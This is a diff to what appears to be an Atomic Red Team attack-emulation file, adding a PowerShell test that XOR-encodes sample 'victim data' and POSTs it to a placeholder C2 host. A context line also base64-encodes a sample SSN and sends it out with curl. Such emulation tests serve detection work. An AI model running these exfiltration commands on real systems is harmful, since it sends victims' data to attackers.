@@ -22,4 +22,36 @@ atomic_tests:
       echo -n 111-11-1111 | base64
       curl -XPOST #{base64_data}.#{destination_url}
     name: sh
+- name: XOR Encoded data.
+  auto_generated_guid: c3ed6d2a-e3ad-400d-ad78-bbfdbfeacc08
+  description: |
+    XOR encodes the data with a XOR key.
+    Reference - https://gist.github.com/loadenmb/8254cee0f0287b896a05dcdc8a30042f
+  supported_platforms:
+  - windows
+  input_arguments:
+    destination_url:
+      description: Destination URL to post encoded data.
+      type: string
+      default: example.com
+    plaintext:
+      description: Plain text mimicking victim data sent to C2 server.
+      type: string
+      default: Path\n----\nC:\Users\victim
+    key:
+      description: XOR key used for encoding the plaintext.
+      type: string
+      default: abcdefghijklmnopqrstuvwxyz123456
+  executor:
+    command: |
+      $plaintext = ([system.Text.Encoding]::UTF8.getBytes("#{plaintext}"))
+      $key = "#{key}"
+      $cyphertext =  @();
+      for ($i = 0; $i -lt $plaintext.Count; $i++) {
+       $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length];
+      }
+      $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext)
+      [System.Net.ServicePointManager]::Expect100Continue = $false
+      Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive
+    name: powershell
 
